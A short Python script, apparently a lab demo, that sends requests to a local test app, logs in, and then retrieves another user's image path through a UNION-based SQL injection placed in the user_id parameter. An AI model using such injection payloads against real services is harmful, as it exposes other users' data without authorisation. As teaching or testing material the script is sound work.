import requests

# Create Victim Database and Table
res = requests.get("http://127.0.0.1:5000/initialize-database")
print(res.json())

#authenticate
parameters = {"user_id" : "1234567890", "password" : "notPassword"}
res = requests.get("http://127.0.0.1:5000/login", params=parameters)
print(res.json())

#Normal Query
parameters = {"user_id" : "1234567890"}
res = requests.get("http://127.0.0.1:5000/select-image", params=parameters)
print(res.json())

#Query with Injection
injection_parameters = {"user_id" : "1234567890 AND 2=1 UNION SELECT image_path from images Where user_id=9999999999"}
res = requests.get("http://127.0.0.1:5000/select-image", params=injection_parameters)
print(res.json())
